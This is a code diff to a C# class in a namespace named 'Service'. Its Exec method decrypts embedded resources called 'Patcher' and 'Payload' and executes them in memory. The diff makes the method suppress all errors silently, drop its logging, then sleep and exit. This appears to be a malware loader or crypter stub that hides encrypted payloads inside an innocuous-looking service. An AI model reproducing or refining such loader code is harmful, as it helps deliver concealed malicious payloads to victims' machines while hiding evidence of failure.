@@ -34,18 +34,21 @@ namespace Service
         public static void Exec()
         {
             //System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { "OnStart" });
-            //try
-            //{
+            try
+            {
 
-            var asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Patcher), Properties.Resources.PatchKey);
-            Execute(asm);
-            asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Payload), Properties.Resources.Key);
-            Execute(asm);
-            //}
-            //catch(Exception ex)
-            //{
-            //    System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { ex.ToString() });
-            //}
+                var asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Patcher), Properties.Resources.PatchKey);
+                Execute(asm);
+                asm = Decrypt(Encoding.UTF8.GetString(Properties.Resources.Payload), Properties.Resources.Key);
+                Execute(asm);
+            }
+            catch (Exception ex)
+            {
+                //System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { ex.ToString()});
+            }
+
+            Thread.Sleep(1000);
+            Environment.Exit(0);
         }
 
         private static byte[] Decrypt(string b64, string secretKey)
